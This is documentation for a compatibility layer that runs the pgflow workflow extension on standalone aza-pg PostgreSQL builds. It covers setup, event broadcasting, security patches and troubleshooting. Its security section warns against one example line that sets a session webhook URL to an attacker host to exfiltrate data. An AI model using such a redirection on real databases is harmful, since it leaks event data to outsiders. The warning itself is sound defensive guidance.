# pgflow v0.13.1 - Supabase Compatibility Layer

This document describes how pgflow (Supabase's workflow orchestration extension) is integrated into aza-pg custom PostgreSQL builds.

## Overview

**pgflow** is designed for Supabase Cloud and expects:

- Supabase Realtime API for event broadcasting
- Supabase Vault for credential storage
- Supabase-specific PostgreSQL settings

**aza-pg** provides a compatibility layer that enables pgflow to work in standalone PostgreSQL installations without Supabase infrastructure.

## Architecture

### Components

1. **realtime.send() Stub** (`04a-pgflow-realtime-stub.sh`)
   - Replaces Supabase Realtime API with PostgreSQL native features
   - 3-layer event broadcasting: pg_notify + pgmq (optional) + pg_net webhooks (optional)
   - Installed in `template1` database - all new databases inherit it automatically

2. **Security Patches** (`docker/postgres/pgflow/security-patches.sql`)
   - Fixes search_path hijacking vulnerabilities (AZA-PGFLOW-001, AZA-PGFLOW-002)
   - Adapts is_local() for non-Supabase environments (COMPAT-AZA-PG-001)
   - Applied at runtime after pgflow schema loads

3. **Custom Installation Marker** (`00-aza-pg-settings.sh`)
   - Sets `app.aza_pg_custom = 'true'` system-wide
   - Used by is_local() to detect custom installations

## Installation

### Initial Database

pgflow is automatically installed during container initialization:

```bash
docker run -e POSTGRES_PASSWORD=secret ghcr.io/fluxo-kt/aza-pg:pg18
# pgflow schema + patches loaded automatically
```

### New Databases

The `realtime.send()` stub is inherited from `template1`:

```sql
-- Create new database with pgflow support
CREATE DATABASE my_app TEMPLATE template1;

-- Install pgflow schema
\c my_app
\i /opt/pgflow/schema.sql
\i /opt/pgflow/security-patches.sql
```

Test that it works:

```sql
SELECT pgflow.is_local();  -- Should return: t (true)
```

## Usage

### Quick Start (Default Database)

In the default database (created via `POSTGRES_DB` environment variable), pgflow is immediately available:

```sql
-- Verify pgflow is installed
SELECT pgflow.is_local();  -- Returns: t (true)

-- List available pgflow tables
\dt pgflow.*

-- Check pgflow schema version
SELECT * FROM pgflow.flows LIMIT 0;  -- Verifies schema loaded
```

**Event Broadcasting**: pgflow workflows trigger `realtime.send()` events, broadcasting via pg_notify, pgmq (optional), and webhooks (optional).

### Using pgflow in New Databases

For databases created after container initialization:

```sql
-- 1. Create new database (inherits realtime.send() from template1)
CREATE DATABASE my_app;

-- 2. Connect to new database
\c my_app

-- 3. Install required extensions (pgflow prerequisites)
CREATE EXTENSION IF NOT EXISTS pgmq;          -- Optional: Message queue for realtime.send() degradation
CREATE EXTENSION IF NOT EXISTS pg_net;        -- Optional: HTTP webhooks via realtime.send()
CREATE EXTENSION IF NOT EXISTS supabase_vault;  -- Optional: Credential storage (pgflow works without it)

-- 4. Install pgflow schema
\i /opt/pgflow/schema.sql
\i /opt/pgflow/security-patches.sql

-- 5. Verify installation
SELECT pgflow.is_local();  -- Returns: t (true)

-- 6. pgflow is now ready - use the DSL or SQL API
```

### Creating and Running Workflows

pgflow uses a **TypeScript DSL** for workflow definition. Direct SQL manipulation of pgflow tables is not recommended.

**Recommended approach** - Use the official TypeScript packages:

```bash
bun add @pgflow/dsl @pgflow/client
```

**TypeScript Example**:

```typescript
import { flow, step } from "@pgflow/dsl";
import { createClient } from "@pgflow/client";

// Initialize pgflow client
const pgflowClient = createClient({
  connectionString: "postgresql://postgres:secret@localhost:5432/postgres",
});

const welcomeFlow = flow("welcome-user").step(
  "send-email",
  step.http({
    url: "https://api.example.com/send-welcome",
    method: "POST",
  })
);

// Deploy and run
await pgflowClient.deploy(welcomeFlow);
await pgflowClient.run("welcome-user", { userId: 123 });
```

**SQL API** (advanced usage):

```sql
-- Create flow
SELECT pgflow.create_flow('my-flow', 3, 5, 60);

-- View flows
SELECT * FROM pgflow.flows;

-- View runs
SELECT * FROM pgflow.runs ORDER BY created_at DESC;
```

For complete workflow examples and DSL documentation, see:

- **[pgflow Official Docs](https://pgflow.dev)** - Complete DSL guide
- **[@pgflow/dsl](https://www.npmjs.com/package/@pgflow/dsl)** - TypeScript DSL
- **[@pgflow/client](https://www.npmjs.com/package/@pgflow/client)** - Client library
- **[pgflow GitHub](https://github.com/pgflow-dev/pgflow)** - Source code and examples

## Event Broadcasting

### Layer 1: PostgreSQL LISTEN/NOTIFY (Always Active)

```sql
-- Application listens for events
LISTEN pgflow_events;

-- pgflow triggers workflow, realtime.send() broadcasts
-- Clients receive notification immediately
```

**Use Case**: Real-time updates in single-server deployments

### Layer 2: pgmq Queue (Optional)

Enable reliable queue delivery:

```sql
ALTER SYSTEM SET realtime.pgmq_enabled = 'true';
SELECT pg_reload_conf();
```

pgflow events are now also queued in `pgflow_events` queue for asynchronous processing:

```sql
-- Consumer processes events from queue
SELECT * FROM pgmq.read('pgflow_events', 10, 30);
```

**Use Case**: Decoupled event processing, guaranteed delivery

### Layer 3: HTTP Webhooks (Optional)

Configure webhook endpoint:

```sql
ALTER SYSTEM SET realtime.webhook_url = 'https://your-api.example.com/pgflow-events';
SELECT pg_reload_conf();
```

pgflow events are now POSTed to the configured URL:

```json
POST https://your-api.example.com/pgflow-events
Content-Type: application/json

{
  "payload": { ... },
  "event": "flow:started",
  "topic": "workflow_123",
  "timestamp": 1705123456.789,
  "private": false
}
```

**Use Case**: Integration with external systems, microservices architecture

## Security

### SSRF Protection

`realtime.send()` is protected against Server-Side Request Forgery (SSRF) attacks:

```sql
-- PUBLIC execution is revoked by default
REVOKE EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) FROM PUBLIC;

-- Only postgres superuser has access
-- Application roles must be explicitly granted
GRANT EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) TO my_app_role;
```

**Rationale**: Prevents unprivileged users from manipulating `realtime.webhook_url` to trigger arbitrary HTTP requests from the database server.

### Webhook URL Management

**✅ SECURE**: System-level configuration (persistent across sessions)

```sql
ALTER SYSTEM SET realtime.webhook_url = 'https://trusted-api.internal/events';
SELECT pg_reload_conf();
```

**❌ INSECURE**: Session-level configuration (can be hijacked by attackers)

```sql
SET realtime.webhook_url = 'https://attacker.com/steal-data';  -- DON'T DO THIS
```

**Best Practice**: Only administrators should configure webhook URLs via `ALTER SYSTEM`.

### Security Patches Applied

| Identifier            | Component                | Issue                   | Fix                                   |
| --------------------- | ------------------------ | ----------------------- | ------------------------------------- |
| **AZA-PGFLOW-001**    | get_run_with_states()    | search_path hijacking   | Added `SET search_path = ''`          |
| **AZA-PGFLOW-002**    | start_flow_with_states() | search_path hijacking   | Added `SET search_path = ''`          |
| **COMPAT-AZA-PG-001** | is_local()               | Supabase-only detection | Check for `app.aza_pg_custom` setting |

## Upstream Tracking

These are **local patches** for compatibility and security. They are tracked internally but not official CVE entries.

## Testing

### Verify Installation

```sql
-- Check realtime.send() exists
SELECT proname, pronargs
FROM pg_proc p
JOIN pg_namespace n ON p.pronamespace = n.oid
WHERE n.nspname = 'realtime' AND proname = 'send';

-- Check pgflow schema
SELECT COUNT(*) FROM pgflow.flows;

-- Test is_local() detection
SELECT pgflow.is_local();  -- Should return: t
```

### Test Event Broadcasting

```sql
-- Start a LISTEN session
LISTEN pgflow_events;

-- Trigger a test event
SELECT realtime.send(
  '{"test": "value"}'::jsonb,
  'test:event',
  'test_topic',
  false
);

-- You should receive a notification:
-- Asynchronous notification "pgflow_events" with payload "{...}" received
```

### Automated Tests

Run comprehensive test suite:

```bash
# Test pgflow installation and security patches
bun run scripts/test/test-pgflow-security.ts

# Test new database functionality
bun run scripts/test/test-pgflow-new-database.ts
```

## Troubleshooting

### Issue: pgflow schema fails to load

**Symptoms**:

```text
ERROR:  function realtime.send() does not exist
```

**Solution**: Verify realtime stub was installed:

```sql
SELECT COUNT(*) FROM pg_proc p
JOIN pg_namespace n ON p.pronamespace = n.oid
WHERE n.nspname = 'realtime' AND proname = 'send';
-- Should return: 1
```

If missing, run the script inside the container:

```bash
docker exec <container-name> bash /docker-entrypoint-initdb.d/04a-pgflow-realtime-stub.sh
```

### Issue: is_local() returns false

**Symptoms**:

```sql
SELECT pgflow.is_local();
-- Returns: f (false)
```

**Solution**: Verify custom installation marker:

```sql
SELECT current_setting('app.aza_pg_custom');
-- Should return: true
```

If not set, run the script inside the container:

```bash
docker exec <container-name> bash /docker-entrypoint-initdb.d/00-aza-pg-settings.sh
```

### Issue: Permission denied on realtime.send()

**Symptoms**:

```text
ERROR:  permission denied for function send
```

**Solution**: Grant EXECUTE permission to your application role:

```sql
GRANT EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) TO my_app_role;
```

### Issue: Webhook not firing

**Checklist**:

1. Is webhook URL configured? `SHOW realtime.webhook_url;`
2. Is pg_net extension loaded? `SELECT * FROM pg_extension WHERE extname = 'pg_net';`
3. Check pg_net logs: `SELECT * FROM net._http_response ORDER BY id DESC LIMIT 10;`
4. Verify network connectivity from database server to webhook endpoint

## Version Compatibility

| aza-pg Version  | pgflow Version | PostgreSQL | Notes                  |
| --------------- | -------------- | ---------- | ---------------------- |
| 18.1-202501xx\* | 0.13.1         | 18.1       | Initial integration    |
| Future          | 0.14.x         | 18.x       | Pending upstream fixes |

\* _Version format note: `xx` represents a timestamp suffix automatically generated during build (e.g., `202501121430` for Jan 12, 2:30 PM). Use the full version tag from your image._

## Performance Considerations

### pg_notify

- **Latency**: <1ms (immediate)
- **Throughput**: 1000s/sec
- **Persistence**: None (in-memory only)
- **Best For**: Real-time UI updates, single-server deployments

### pgmq

- **Latency**: ~10ms (queue write)
- **Throughput**: 100s-1000s/sec
- **Persistence**: Durable (table-backed)
- **Best For**: Reliable event processing, work queues

### pg_net Webhooks

- **Latency**: ~50-500ms (HTTP round-trip)
- **Throughput**: 10s-100s/sec
- **Persistence**: Best-effort (no retry on failure)
- **Best For**: External system integration, audit trails

## References

- [pgflow Documentation](https://github.com/pgflow-dev/pgflow)
- [Supabase Realtime](https://supabase.com/docs/guides/realtime)
- [PostgreSQL LISTEN/NOTIFY](https://www.postgresql.org/docs/current/sql-notify.html)
- [pgmq Extension](https://github.com/tembo-io/pgmq)
- [pg_net Extension](https://github.com/supabase/pg_net)

## Contributing

Found a bug or have a suggestion? Please file an issue at: [aza-pg/issues](https://github.com/fluxo-kt/aza-pg/issues)

When reporting pgflow issues, include:

- aza-pg image version
- pgflow version (check `/opt/pgflow/schema.sql` header or `docker/postgres/pgflow/security-patches.sql`)
- Error message and stack trace
- Steps to reproduce
